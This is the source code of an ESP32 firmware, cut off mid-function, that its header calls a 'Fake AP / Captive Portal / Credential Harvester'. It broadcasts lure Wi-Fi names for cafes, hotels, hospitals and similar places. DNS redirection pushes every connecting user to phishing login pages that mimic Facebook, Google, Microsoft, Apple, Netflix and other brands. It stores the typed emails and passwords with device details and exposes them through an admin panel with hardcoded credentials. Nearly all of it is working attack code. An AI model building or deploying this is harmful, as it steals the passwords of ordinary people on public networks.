/*
 * NETEEN - ESP32 Fake AP / Captive Portal / Credential Harvester
 * made by: Apspydon
 *
 * WIRING:
 *   OLED    : GND->GND  VCC->3V3  SCL->22  SDA->21
 *   JOYSTICK: GND->GND  VCC->3V3  VRx->34  VRy->35  SW->32
 */

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <Wire.h>
#include <LittleFS.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

#define PIN_I2C_SDA 21
#define PIN_I2C_SCL 22
#define PIN_JOY_X   34
#define PIN_JOY_Y   35
#define PIN_JOY_SW  32

#define OLED_W 128
#define OLED_H  64
#define OLED_ADDR 0x3C

Adafruit_SSD1306 display(OLED_W, OLED_H, &Wire, -1);
WebServer httpServer(80);
DNSServer dnsServer;

bool fsReady = false, apRunning = false, dirty = true, screenLocked = false;
int credCount = 0;
String lastCredLine = "";
uint32_t lastCredAt = 0;

const int JOY_ACTIVE_HI = 2800;
const int JOY_ACTIVE_LO = 1300;

enum NavDir { NAV_NONE = 0, NAV_UP, NAV_DOWN, NAV_LEFT, NAV_RIGHT, NAV_PRESS };
NavDir lastDir = NAV_NONE;
uint32_t lastNavMs = 0;
bool lastSwState = true;

enum Screen {
  SCR_MAIN, SCR_AP_MODE, SCR_STD_LIST, SCR_CUSTOM_COLOR,
  SCR_CUSTOM_FIELD1, SCR_CUSTOM_FIELD2, SCR_CATEGORY, SCR_SSID,
  SCR_RUNNING, SCR_CREDS_LIST, SCR_CRED_VIEW, SCR_DELETE_LIST,
  SCR_DELETE_CONFIRM, SCR_WIFI_SCAN, SCR_SYSINFO, SCR_CONFIRM_EXIT,
  SCR_LOCKED
};
Screen screen = SCR_MAIN;

enum Flow { FLOW_NONE, FLOW_STANDARD, FLOW_CUSTOM };
Flow pendingFlow = FLOW_NONE;

int menuIdx = 0, scrollTop = 0;
String selectedCategory = "", selectedSSID = "";
int selectedPreset = 0, selectedColor = 0, selectedField1 = 0, selectedField2 = 0;

#define MAX_CRED_FILES 40
String credFiles[MAX_CRED_FILES];
int credFileCount = 0;
String viewingFile = "";
int viewScroll = 0;

#define MAX_SCAN 30
String scanSSID[MAX_SCAN];
int scanRSSI[MAX_SCAN], scanChan[MAX_SCAN], scanCount = 0;

const char* CATS[] = {
  "Cafes", "Airports", "Hotels", "Malls", "Restaurants",
  "Transit", "Gyms", "Hospitals", "Schools", "Public"
};
const int CAT_COUNT = 10;

const char* SSIDS[10][10] = {
  { "Cafe WiFi Free", "Coffee House", "Starbucks WiFi", "Espresso Bar", "The Roastery",
    "Cafe Gratis", "WiFi del Cafe", "Cafeteria Central", "Barista Net", "Cafe Internet" },
  { "Airport Free WiFi", "Terminal WiFi", "Sky Lounge", "FlyWiFi", "Gate Connect",
    "WiFi Aeropuerto", "Terminal Gratis", "Vuelo WiFi", "Sala VIP", "Salida WiFi" },
  { "Hotel Guest WiFi", "Lobby WiFi", "Grand Hotel", "Suite Connect", "Resort Free",
    "WiFi del Hotel", "Huespedes WiFi", "Gran Hotel", "Recepcion WiFi", "Suite Gratis" },
  { "Mall Free WiFi", "Shopping WiFi", "Center WiFi", "Retail Connect", "Galleria",
    "WiFi del Centro", "Compras WiFi", "Plaza Gratis", "Centro Comercial", "Tienda Net" },
  { "Restaurant WiFi", "Guest Network", "Bistro WiFi", "Diner Free", "Table Connect",
    "WiFi Restaurante", "Clientes WiFi", "Bistro Gratis", "Mesa Conectada", "Comida WiFi" },
  { "Metro Free WiFi", "Bus Terminal", "Train Station", "Subway WiFi", "Transit Connect",
    "WiFi Metro", "Estacion Gratis", "Tren WiFi", "Autobus Net", "Transporte WiFi" },
  { "Gym WiFi Free", "Fitness Connect", "Workout WiFi", "Sports Club", "Athletic Net",
    "WiFi del Gym", "Gimnasio Gratis", "Fitness WiFi", "Deporte Net", "Entrena WiFi" },
  { "Hospital Guest", "Clinic WiFi", "Medical Center", "Health Connect", "Patient WiFi",
    "WiFi Hospital", "Clinica Gratis", "Pacientes WiFi", "Centro Medico", "Salud Net" },
  { "Campus WiFi", "Student Connect", "University Net", "Library WiFi", "School Guest",
    "WiFi Campus", "Estudiantes WiFi", "Universidad Net", "Biblioteca Gratis", "Escuela WiFi" },
  { "Public WiFi Free", "City Connect", "Municipal Net", "Open WiFi", "Free Internet",
    "WiFi Publico", "Ciudad Conectada", "Ayuntamiento WiFi", "Internet Gratis", "Plaza WiFi" },
};

// ==================== BRAND LOGOS (inline SVG for HTML) ====================
const char* LOGO_SVG[] = {
  // 0 Normal - shield
  "<svg width='44' height='44' viewBox='0 0 24 24'><path fill='#4285F4' d='M12 2 4 5v7c0 5 3.5 9 8 10 4.5-1 8-5 8-10V5l-8-3z'/><path fill='#fff' d='M10.5 14.5 8 12l-1.4 1.4 3.9 3.9 7.1-7.1L16.2 9z'/></svg>",
  // 1 Facebook
  "<svg width='44' height='44' viewBox='0 0 24 24'><path fill='#1877F2' d='M24 12A12 12 0 1 0 10 23.9v-8.4H7v-3.5h3V9.4c0-3 1.8-4.7 4.5-4.7 1.3 0 2.7.2 2.7.2v3h-1.5c-1.5 0-2 .9-2 1.9v2.3h3.3l-.5 3.5h-2.8v8.4A12 12 0 0 0 24 12z'/></svg>",
  // 2 Instagram
  "<svg width='44' height='44' viewBox='0 0 24 24'><defs><linearGradient id='ig' x1='0' y1='1' x2='1' y2='0'><stop offset='0' stop-color='#FEDA75'/><stop offset='0.5' stop-color='#D62976'/><stop offset='1' stop-color='#4F5BD5'/></linearGradient></defs><rect width='24' height='24' rx='6' fill='url(#ig)'/><circle cx='12' cy='12' r='5' fill='none' stroke='#fff' stroke-width='2'/><circle cx='18' cy='6' r='1.3' fill='#fff'/></svg>",
  // 3 Google
  "<svg width='44' height='44' viewBox='0 0 24 24'><path fill='#4285F4' d='M22.6 12.3c0-.8-.1-1.6-.2-2.3H12v4.5h6c-.3 1.4-1 2.5-2.2 3.3v2.7h3.6c2.1-1.9 3.2-4.8 3.2-8.2z'/><path fill='#34A853' d='M12 23c2.9 0 5.4-1 7.2-2.6l-3.6-2.7c-1 .7-2.2 1.1-3.6 1.1-2.8 0-5.2-1.9-6-4.4H2.3v2.8C4.1 20.7 7.8 23 12 23z'/><path fill='#FBBC05' d='M6 14.4c-.2-.6-.3-1.3-.3-2s.1-1.4.3-2V7.6H2.3C1.5 9 1 10.4 1 12s.5 3 1.3 4.4L6 14.4z'/><path fill='#EA4335' d='M12 5.4c1.6 0 3 .5 4.1 1.6l3.1-3.1C17.4 2 14.9 1 12 1 7.8 1 4.1 3.3 2.3 6.6L6 9.4c.8-2.5 3.2-4 6-4z'/></svg>",
  // 4 Microsoft
  "<svg width='44' height='44' viewBox='0 0 24 24'><rect x='1' y='1' width='10' height='10' fill='#F25022'/><rect x='13' y='1' width='10' height='10' fill='#7FBA00'/><rect x='1' y='13' width='10' height='10' fill='#00A4EF'/><rect x='13' y='13' width='10' height='10' fill='#FFB900'/></svg>",
  // 5 Twitter/X
  "<svg width='44' height='44' viewBox='0 0 24 24'><path fill='#fff' d='M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z'/></svg>",
  // 6 TikTok
  "<svg width='44' height='44' viewBox='0 0 24 24'><path fill='#fff' d='M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-5.2 1.74 2.89 2.89 0 0 1 2.31-4.64 2.93 2.93 0 0 1 .88.13V9.4a6.84 6.84 0 0 0-1-.05A6.33 6.33 0 0 0 5 20.1a6.34 6.34 0 0 0 10.86-4.43v-7a8.16 8.16 0 0 0 4.77 1.52v-3.4a4.85 4.85 0 0 1-1-.1z'/></svg>",
  // 7 Apple
  "<svg width='44' height='44' viewBox='0 0 24 24'><path fill='#fff' d='M17.05 12.54c-.03-2.7 2.2-4 2.3-4.06-1.25-1.83-3.2-2.08-3.9-2.1-1.66-.17-3.24.98-4.08.98-.85 0-2.14-.96-3.52-.93-1.81.03-3.48 1.05-4.4 2.67-1.87 3.25-.48 8.05 1.34 10.7.9 1.29 1.96 2.74 3.36 2.69 1.34-.06 1.85-.87 3.47-.87s2.08.87 3.5.84c1.45-.02 2.37-1.3 3.25-2.6 1.03-1.5 1.46-2.96 1.48-3.04-.03-.01-2.83-1.09-2.86-4.28zM14.3 4.6c.74-.9 1.24-2.14 1.1-3.38-1.07.04-2.37.71-3.14 1.61-.69.79-1.29 2.06-1.13 3.27 1.19.09 2.42-.6 3.17-1.5z'/></svg>",
  // 8 Netflix
  "<svg width='44' height='44' viewBox='0 0 24 24'><path fill='#E50914' d='M5 22h3V9.6l8 12.4h3V2h-3v12.4L8 2H5v20z'/></svg>",
  // 9 LinkedIn
  "<svg width='44' height='44' viewBox='0 0 24 24'><rect width='24' height='24' rx='3' fill='#0A66C2'/><path fill='#fff' d='M5 8.5h3v11H5zm1.5-4.5a1.75 1.75 0 1 1 0 3.5 1.75 1.75 0 0 1 0-3.5zM10 8.5h3v1.5c.5-.9 1.7-1.8 3.5-1.8 3 0 3.5 1.8 3.5 4.3V19.5h-3v-6c0-1.4-.5-2.3-1.8-2.3s-2.2 1-2.2 2.4V19.5h-3z'/></svg>"
};

struct StdStyle {
  const char* name;
  const char* title;
  const char* subtitle;
  const char* accent;
  const char* bg;
  const char* card;
  const char* button;
  int fieldCount;
  const char* footer;
};

const StdStyle STD_STYLES[] = {
  { "Normal",     "Sign in",               "to continue to NETEEN",             "#4285f4", "#1a1a1a", "#2d2d2d", "Sign in",  3,
    "English (United States)" },
  { "Facebook",   "Log in to Facebook",    "You must log in to continue",       "#1877F2", "#18191A", "#242526", "Log in",   2,
    "English (US) \xC2\xB7 Espa\xC3\xB1ol \xC2\xB7 Fran\xC3\xA7ais \xC2\xB7 \xE4\xB8\xAD\xE6\x96\x87" },
  { "Instagram",  "Instagram",             "Log in to continue",                "#E4405F", "#1a1a1a", "#262626", "Log In",   2,
    "English (UK) \xC2\xB7 Espa\xC3\xB1ol \xC2\xB7 \xE6\x97\xA5\xE6\x9C\xAC\xE8\xAA\x9E" },
  { "Google",     "Sign in",               "with your Google Account",          "#4285f4", "#202124", "#303134", "Next",     2,
    "English (United States)" },
  { "Microsoft",  "Sign in",               "to continue to Outlook",            "#0078d4", "#1f1f1f", "#2d2d2d", "Next",     2,
    "Terms of use   Privacy & cookies" },
  { "Twitter / X","Sign in to X",          "Enter your details to continue",    "#1DA1F2", "#000000", "#16181c", "Log in",   2,
    "Don't have an account? Sign up" },
  { "TikTok",     "Log in to TikTok",      "Manage your account, check notifications, comment on videos, and more.", "#FE2C55", "#000000", "#1c1c1c", "Log in",   2,
    "Don't have an account? Sign up" },
  { "Apple ID",   "Sign in with Apple ID", "Use your Apple ID to continue",     "#0071e3", "#000000", "#1d1d1f", "Continue", 2,
    "Forgot Apple ID or password?" },
  { "Netflix",    "Sign In",               "",                                  "#E50914", "#000000", "#141414", "Sign In",  2,
    "New to Netflix? Sign up now." },
  { "LinkedIn",   "Sign in",               "Stay updated on your professional world","#0A66C2","#1a1a1a","#2d2d2d", "Sign in",  2,
    "New to LinkedIn? Join now" }
};
const int STD_COUNT = 10;

const char* STD_LABELS[10][3] = {
  { "WiFi Password", "Email", "Password" },
  { "Email or Phone", "Password", "" },
  { "Phone number, username or email", "Password", "" },
  { "Email or phone", "Enter your password", "" },
  { "Email, phone, or Skype", "Password", "" },
  { "Phone, email, or username", "Password", "" },
  { "Phone number, email, or username", "Password", "" },
  { "Apple ID", "Password", "" },
  { "Email or phone number", "Password", "" },
  { "Email or phone", "Password", "" }
};
const char* STD_NAMES[10][3] = {
  { "wifi", "email", "password" },
  { "email", "password", "" },
  { "email", "password", "" },
  { "email", "password", "" },
  { "email", "password", "" },
  { "email", "password", "" },
  { "email", "password", "" },
  { "email", "password", "" },
  { "email", "password", "" },
  { "email", "password", "" }
};
const char* STD_TYPES[10][3] = {
  { "text", "email", "password" },
  { "text", "password", "" },
  { "text", "password", "" },
  { "text", "password", "" },
  { "text", "password", "" },
  { "text", "password", "" },
  { "text", "password", "" },
  { "email", "password", "" },
  { "text", "password", "" },
  { "text", "password", "" }
};

const char* COLORS_NAME[] = { "Blue", "Dark", "Green", "Red", "Purple", "Orange" };
const char* COLORS_BG[]   = { "#1a1a1a", "#0a0a0a", "#0a1f0a", "#1f0a0a", "#1a0a1f", "#1f1000" };
const char* COLORS_CARD[] = { "#2d2d2d", "#1a1a1a", "#1a2a1a", "#2a1a1a", "#2a1a2a", "#2a1a00" };
const char* COLORS_ACC[]  = { "#4285f4", "#555555", "#00cc44", "#cc0000", "#8844cc", "#ff8800" };
const int COLOR_COUNT = 6;

const char* FIELD_LABELS[] = {
  "Email", "Email or Phone", "Username", "Phone Number",
  "Password", "WiFi Password", "PIN Code", "Access Code",
  "Full Name", "Room Number"
};
const char* FIELD_NAMES[] = { "f0","f1","f2","f3","f4","f5","f6","f7","f8","f9" };
const char* FIELD_TYPES[] = {
  "email", "text", "text", "tel",
  "password", "text", "text", "text",
  "text", "text"
};
const int FIELD_COUNT = 10;

struct ActivePortal {
  String title, subtitle, accent, bg, card, button;
  int fieldCount;
  String labels[4], names[4], types[4];
  String logo, footer;
};
ActivePortal active;

void buildFromStandard(int idx) {
  const StdStyle& s = STD_STYLES[idx];
  active.title = s.title; active.subtitle = s.subtitle;
  active.accent = s.accent; active.bg = s.bg; active.card = s.card;
  active.button = s.button; active.fieldCount = s.fieldCount;
  active.logo = LOGO_SVG[idx];
  active.footer = s.footer;
  for (int i = 0; i < s.fieldCount; i++) {
    active.labels[i] = STD_LABELS[idx][i];
    active.names[i]  = STD_NAMES[idx][i];
    active.types[i]  = STD_TYPES[idx][i];
  }
}

void buildFromCustom() {
  active.title = "Sign in";
  active.subtitle = "Sign in to continue";
  active.accent = COLORS_ACC[selectedColor];
  active.bg = COLORS_BG[selectedColor];
  active.card = COLORS_CARD[selectedColor];
  active.button = "Sign in";
  active.fieldCount = 2;
  active.labels[0] = FIELD_LABELS[selectedField1];
  active.names[0]  = FIELD_NAMES[selectedField1];
  active.types[0]  = FIELD_TYPES[selectedField1];
  active.labels[1] = FIELD_LABELS[selectedField2];
  active.names[1]  = FIELD_NAMES[selectedField2];
  active.types[1]  = FIELD_TYPES[selectedField2];
  active.logo = LOGO_SVG[0];
  active.footer = "English (United States)";
}

void serialLog(const String& s) { Serial.println("[LOG] " + s); }

String shortLabel(const String& lbl) {
  String l = lbl; l.toLowerCase();
  if (l.indexOf("wifi") >= 0) return "WiFi";
  if (l.indexOf("email") >= 0) return "Email";
  if (l.indexOf("password") >= 0) return "Password";
  return lbl;
}

void printWrapped(Print& out, const String& text, int width) {
  if (text.length() == 0) { out.println(); return; }
  int pos = 0;
  while (pos < (int)text.length()) {
    int chunk = (int)text.length() - pos;
    if (chunk > width) chunk = width;
    out.println(text.substring(pos, pos + chunk));
    pos += chunk;
  }
}

String ipToSlug(const String& ip) { String s = ip; s.replace(".", "-"); return s; }

String deviceFromUA(const String& ua) {
  if (ua.indexOf("iPhone") >= 0) return "iPhone";
  if (ua.indexOf("iPad")   >= 0) return "iPad";
  if (ua.indexOf("Android")>= 0) return "Android";
  if (ua.indexOf("Windows")>= 0) return "Windows";
  if (ua.indexOf("Mac")    >= 0) return "Mac";
  if (ua.indexOf("Linux")  >= 0) return "Linux";
  return "Unknown";
}

String nextCredFile(const String& ipSlug) {
  String base = "/creds/" + ipSlug;
  String path = base + ".txt";
  if (!LittleFS.exists(path)) return path;
  for (int i = 2; i < 999; i++) {
    path = base + "-" + String(i) + ".txt";
    if (!LittleFS.exists(path)) return path;
  }
  return base + "-many.txt";
}

void saveCredToFlash(const String& ip, const String& dev) {
  if (!fsReady) return;
  if (!LittleFS.exists("/creds")) LittleFS.mkdir("/creds");
  String path = nextCredFile(ipToSlug(ip));
  File f = LittleFS.open(path, FILE_WRITE);
  if (!f) { serialLog("file write fail"); return; }
  f.println("=== NETEEN CAPTURE ===");
  f.print("Time:   "); f.println(String(millis()));
  f.print("IP:     "); f.println(ip);
  f.print("Device: "); f.println(dev);
  f.print("SSID:   "); f.println(selectedSSID);
  f.print("Style:  "); f.println(active.title);
  for (int i = 0; i < active.fieldCount; i++) {
    String v = httpServer.arg(active.names[i]);
    f.print(shortLabel(active.labels[i]));
    f.print(": ");
    f.println(v);
  }
  f.println("======================");
  f.close();
  serialLog("saved: " + path);
}

void refreshCredList() {
  credFileCount = 0;
  if (!fsReady) return;
  File dir = LittleFS.open("/creds");
  if (!dir || !dir.isDirectory()) return;
  File f = dir.openNextFile();
  while (f && credFileCount < MAX_CRED_FILES) {
    String nm = String(f.name());
    if (nm.startsWith("/creds/")) nm = nm.substring(7);
    else if (nm.startsWith("/"))  nm = nm.substring(1);
    credFiles[credFileCount++] = nm;
    f = dir.openNextFile();
  }
  dir.close();
}

void deleteCredFile(const String& name) {
  if (!fsReady) return;
  LittleFS.remove("/creds/" + name);
  refreshCredList();
}

void deleteAllCreds() {
  if (!fsReady) return;
  String names[MAX_CRED_FILES];
  int n = 0;
  File dir = LittleFS.open("/creds");
  if (!dir) return;
  File f = dir.openNextFile();
  while (f && n < MAX_CRED_FILES) {
    String nm = String(f.name());
    if (nm.startsWith("/creds/")) nm = nm.substring(7);
    else if (nm.startsWith("/"))  nm = nm.substring(1);
    names[n++] = nm;
    f = dir.openNextFile();
  }
  dir.close();
  for (int i = 0; i < n; i++) LittleFS.remove("/creds/" + names[i]);
  refreshCredList();
  credCount = 0;
  serialLog("deleted " + String(n) + " cred files");
}

String readFile(const String& path) {
  if (!fsReady) return "";
  File f = LittleFS.open(path, FILE_READ);
  if (!f) return "";
  String s;
  while (f.available()) s += (char)f.read();
  f.close();
  return s;
}

// ==================== ENHANCED HTML ====================
String loginPage() {
  String h = "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'>";
  h += "<meta name='viewport' content='width=device-width,initial-scale=1,viewport-fit=cover'>";
  h += "<meta name='apple-mobile-web-app-capable' content='yes'>";
  h += "<meta name='theme-color' content='" + active.bg + "'>";
  h += "<title>" + active.title + "</title>";
  h += "<style>";
  h += "*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}";
  h += "html,body{margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;";
  h += "background:" + active.bg + ";color:#fff;min-height:100vh}";
  h += "body{display:flex;flex-direction:column;justify-content:center;align-items:center;padding:20px}";
  h += ".logo{margin-bottom:22px;display:flex;justify-content:center}";
  h += ".box{background:" + active.card + ";padding:40px 36px;border-radius:12px;";
  h += "width:100%;max-width:400px;border:1px solid rgba(255,255,255,.08);";
  h += "box-shadow:0 10px 40px rgba(0,0,0,.4)}";
  h += "h1{margin:0 0 8px;font-size:24px;font-weight:400;text-align:center;letter-spacing:-.3px}";
  h += "h2{margin:0 0 8px;font-size:20px;font-weight:500;text-align:center}";
  h += "p{color:#bbb;text-align:center;margin:0 0 28px;font-size:14px;line-height:1.4}";
  h += "input{width:100%;padding:14px 16px;margin:8px 0;border:1px solid #555;";
  h += "border-radius:8px;background:#1a1a1a;color:#fff;font-size:15px;";
  h += "font-family:inherit;transition:border-color .15s,box-shadow .15s}";
  h += "input:focus{border-color:" + active.accent + ";outline:none;box-shadow:0 0 0 3px rgba(66,133,244,.15)}";
  h += "button{width:100%;padding:14px;background:" + active.accent + ";color:#fff;border:0;";
  h += "border-radius:8px;cursor:pointer;margin-top:18px;font-size:15px;font-weight:600;";
  h += "font-family:inherit;transition:filter .15s}";
  h += "button:active{filter:brightness(.9)}";
  h += ".row{display:flex;align-items:center;justify-content:space-between;margin:14px 0 4px;font-size:13px}";
  h += ".row label{color:#ccc;display:flex;align-items:center;gap:6px;cursor:pointer}";
  h += ".row a{color:" + active.accent + ";text-decoration:none;font-weight:500}";
  h += ".divider{display:flex;align-items:center;margin:22px 0;color:#666;font-size:12px}";
  h += ".divider:before,.divider:after{content:'';flex:1;height:1px;background:#444}";
  h += ".divider span{padding:0 12px}";
  h += ".social{display:flex;gap:10px;margin-top:16px}";
  h += ".social button{background:#2a2a2a;color:#fff;font-weight:500;margin:0;font-size:13px;padding:11px}";
  h += ".ft{color:#777;font-size:12px;margin-top:26px;text-align:center;line-height:1.6}";
  h += ".ft a{color:#999;text-decoration:none;margin:0 6px}";
  h += ".bottom{margin-top:26px;font-size:12px;color:#777;text-align:center}";
  h += ".bottom a{color:#999;text-decoration:none;margin:0 8px}";
  h += "</style></head><body>";
  h += "<div class='logo'>" + active.logo + "</div>";
  h += "<div class='box'>";
  h += "<h2>" + active.title + "</h2>";
  if (active.subtitle.length()) h += "<p>" + active.subtitle + "</p>";
  h += "<form method='POST' action='/login' autocomplete='on'>";
  for (int i = 0; i < active.fieldCount; i++) {
    h += "<input type='" + active.types[i] + "' name='" + active.names[i] +
         "' placeholder='" + active.labels[i] + "' required autocomplete='off' autocapitalize='off'>";
  }
  if (active.fieldCount == 2) {
    h += "<div class='row'><label><input type='checkbox' style='width:auto;margin:0;padding:0'> Remember me</label>";
    h += "<a href='#'>Forgot password?</a></div>";
  }
  h += "<button type='submit' id='submitBtn'>" + active.button + "</button>";
  h += "</form>";
  h += "<div class='ft'>" + active.footer + "</div>";
  h += "</div>";
  h += "<div class='bottom'><a href='#'>Terms</a><a href='#'>Privacy</a><a href='#'>Help</a></div>";
  h += "<style>@keyframes nsp{to{transform:rotate(360deg)}}</style>";
  h += "<script>(function(){";
  h += "var f=document.querySelector('form'),b=document.getElementById('submitBtn');";
  h += "f.addEventListener('submit',function(e){";
  h += "e.preventDefault();";
  h += "if(b.disabled)return;";
  h += "if(!f.reportValidity())return;";
  h += "b.disabled=true;";
  h += "b.innerHTML='<svg width=\'16\' height=\'16\' viewBox=\'0 0 24 24\' style=\'vertical-align:middle;margin-right:6px;animation:nsp 0.8s linear infinite\' fill=\'none\' stroke=\'#fff\' stroke-width=\'3\'><path d=\'M21 12a9 9 0 1 1-6.2-8.5\' stroke-linecap=\'round\'/></svg>Verifying...';";
  h += "var d=600+Math.floor(Math.random()*1400);";
  h += "setTimeout(function(){f.submit();},d);";
  h += "});})();";
  h += "</script>";
  h += "</body></html>";
  return h;
}

String successPage() {
  String h = "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'>";
  h += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
  h += "<meta name='theme-color' content='" + active.bg + "'>";
  h += "<title>Connected</title><style>";
  h += "body{margin:0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;";
  h += "background:" + active.bg + ";color:#fff;min-height:100vh;display:flex;";
  h += "justify-content:center;align-items:center;padding:20px}";
  h += ".box{background:" + active.card + ";padding:48px 40px;border-radius:12px;";
  h += "max-width:400px;text-align:center;border:1px solid rgba(255,255,255,.08)}";
  h += ".check{width:64px;height:64px;margin:0 auto 20px;border-radius:50%;";
  h += "background:" + active.accent + ";display:flex;align-items:center;justify-content:center}";
  h += "h2{margin:0 0 12px;font-weight:400;font-size:22px}";
  h += "p{color:#bbb;line-height:1.5;margin:0;font-size:14px}";
  h += "</style></head><body><div class='box'>";
  h += "<div class='check'><svg width='32' height='32' viewBox='0 0 24 24' fill='none' stroke='#fff' stroke-width='3' stroke-linecap='round' stroke-linejoin='round'><polyline points='20 6 9 17 4 12'/></svg></div>";
  h += "<h2>You're connected</h2>";
  h += "<p>You can now browse the internet normally. This window will close automatically.</p>";
  h += "</div></body></html>";
  return h;
}

void handleRoot() { httpServer.send(200, "text/html", loginPage()); }
void handleSuccess() { httpServer.send(200, "text/html", successPage()); }

void handleLogin() {
  String ua  = httpServer.header("User-Agent");
  String dev = deviceFromUA(ua);
  String ip  = httpServer.client().remoteIP().toString();

  Serial.println();
  Serial.println("========== CREDENTIAL CAPTURED ==========");
  Serial.print("IP: ");     Serial.println(ip);
  Serial.print("Device: "); Serial.println(dev);
  Serial.print("SSID: ");   Serial.println(selectedSSID);
  Serial.print("Style: ");  Serial.println(active.title);
  for (int i = 0; i < active.fieldCount; i++) {
    Serial.print(shortLabel(active.labels[i]));
    Serial.println(":");
    printWrapped(Serial, httpServer.arg(active.names[i]), 60);
  }
  Serial.println("=========================================");
  Serial.println();

  saveCredToFlash(ip, dev);

  credCount++;
  lastCredLine = "";
  if (active.fieldCount > 0) {
    lastCredLine = httpServer.arg(active.names[active.fieldCount - 1]);
  }
  lastCredAt = millis();
  dirty = true;

  httpServer.sendHeader("Location", "/success");
  httpServer.send(302, "text/plain", "");
}

void handleNotFound() {
  httpServer.sendHeader("Location", "http://192.168.4.1/");
  httpServer.send(302, "text/plain", "");
}

// ==================== ADMIN PANEL ====================
const char* ADMIN_AUTH = "Basic YWRtaW46YWRtaW4xMjM=";

bool checkAdmin() { return httpServer.header("Authorization") == ADMIN_AUTH; }
void sendAuthPrompt() {
  httpServer.sendHeader("WWW-Authenticate", "Basic realm='NETEEN Admin'");
  httpServer.send(401, "text/plain", "Authentication required");
}

void handleAdmin() {
  if (!checkAdmin()) { sendAuthPrompt(); return; }
  refreshCredList();
  String h = "<!DOCTYPE html><html><head><meta charset='UTF-8'>";
  h += "<title>NETEEN Admin</title>";
  h += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
  h += "<style>";
  h += "body{font-family:system-ui,-apple-system,sans-serif;background:#0d0d0d;color:#eee;padding:24px;max-width:900px;margin:auto}";
  h += "h1{color:#4af;margin:0 0 8px}";
  h += ".meta{color:#888;font-size:13px;margin-bottom:18px}";
  h += ".btns{margin:14px 0 22px}";
  h += ".btn{display:inline-block;padding:9px 16px;background:#4af;color:#fff;border:0;border-radius:5px;text-decoration:none;cursor:pointer;font-size:13px;margin-right:6px}";
  h += ".btn.red{background:#e33}.btn.grey{background:#444}";
  h += ".row{background:#1a1a1a;padding:12px 14px;margin:8px 0;border-radius:6px;display:flex;justify-content:space-between;align-items:center;border:1px solid #222}";
  h += ".row b{color:#4af}";
  h += ".empty{color:#666;text-align:center;padding:30px}";
  h += "</style></head><body>";
  h += "<h1>NETEEN Admin</h1>";
  h += "<div class='meta'>Files: <b>" + String(credFileCount) + "</b> &middot; ";
  h += "Heap: " + String(ESP.getFreeHeap()) + " B &middot; ";
  h += "AP: " + String(apRunning ? "running" : "stopped") + " &middot; ";
  h += "SSID: " + selectedSSID + "</div>";
  h += "<div class='btns'>";
  h += "<a class='btn' href='/admin/download'>Download All (.txt)</a>";
  h += "<a class='btn red' href='/admin/deleteall' onclick=\"return confirm('Delete ALL files?')\">Delete ALL</a>";
  h += "<a class='btn grey' href='/'>Back to portal</a>";
  h += "</div>";
  if (credFileCount == 0) {
    h += "<div class='empty'>No captures yet.</div>";
  } else {
    for (int i = 0; i < credFileCount; i++) {
      h += "<div class='row'><b>" + credFiles[i] + "</b><div>";
      h += "<a class='btn' href='/admin/view?f=" + credFiles[i] + "'>View</a> ";
      h += "<a class='btn red' href='/admin/delete?f=" + credFiles[i] + "' onclick=\"return confirm('Delete?')\">Del</a>";
      h += "</div></div>";
    }
  }
  h += "</body></html>";
  httpServer.send(200, "text/html", h);
}

void handleAdminDownload() {
  if (!checkAdmin()) { sendAuthPrompt(); return; }
  refreshCredList();
  String out = "NETEEN CREDENTIAL EXPORT\n";
  out += "Uptime: " + String(millis()) + " ms\n";
  out += "Files:  " + String(credFileCount) + "\n";
  out += "========================\n\n";
  for (int i = 0; i < credFileCount; i++) {
    out += "--- " + credFiles[i] + " ---\n";
    out += readFile("/creds/" + credFiles[i]);
    out += "\n";
  }
  httpServer.sendHeader("Content-Disposition", "attachment; filename=neteen_export.txt");
  httpServer.send(200, "text/plain", out);
}

void handleAdminView() {
  if (!checkAdmin()) { sendAuthPrompt(); return; }
  String fname = httpServer.arg("f");
  if (fname.indexOf("..") >= 0 || fname.indexOf("/") >= 0) {
    httpServer.send(400, "text/plain", "bad name");
    return;
  }
  httpServer.send(200, "text/plain", readFile("/creds/" + fname));
}

void handleAdminDelete() {
  if (!checkAdmin()) { sendAuthPrompt(); return; }
  String fname = httpServer.arg("f");
  if (fname.length() > 0 && fname.indexOf("..") < 0 && fname.indexOf("/") < 0) {
    LittleFS.remove("/creds/" + fname);
  }
  httpServer.sendHeader("Location", "/admin");
  httpServer.send(302, "text/plain", "");
}

void handleAdminDeleteAll() {
  if (!checkAdmin()) { sendAuthPrompt(); return; }
  deleteAllCreds();
  httpServer.sendHeader("Location", "/admin");
  httpServer.send(302, "text/plain", "");
}

void startFakeAP(const String& ssid) {
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid.c_str());
  delay(300);
  dnsServer.start(53, "*", WiFi.softAPIP());
  httpServer.on("/",         HTTP_GET,  handleRoot);
  httpServer.on("/login",    HTTP_POST, handleLogin);
  httpServer.on("/success",  HTTP_GET,  handleSuccess);
  httpServer.on("/admin",          HTTP_GET, handleAdmin);
  httpServer.on("/admin/download", HTTP_GET, handleAdminDownload);
  httpServer.on("/admin/view",     HTTP_GET, handleAdminView);
  httpServer.on("/admin/delete",   HTTP_GET, handleAdminDelete);
  httpServer.on("/admin/deleteall",HTTP_GET, handleAdminDeleteAll);
  httpServer.onNotFound(handleNotFound);
  httpServer.begin();
  apRunning = true;
  serialLog("AP started: " + ssid + " IP=" + WiFi.softAPIP().toString());
  serialLog("Admin: http://192.168.4.1/admin  user=admin pass=admin123");
}

void stopFakeAP() {
  if (!apRunning) return;
  httpServer.stop();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);
  apRunning = false;
  serialLog("AP stopped");
}

void doWifiScan() {
  screenLocked = true;
  display.clearDisplay();
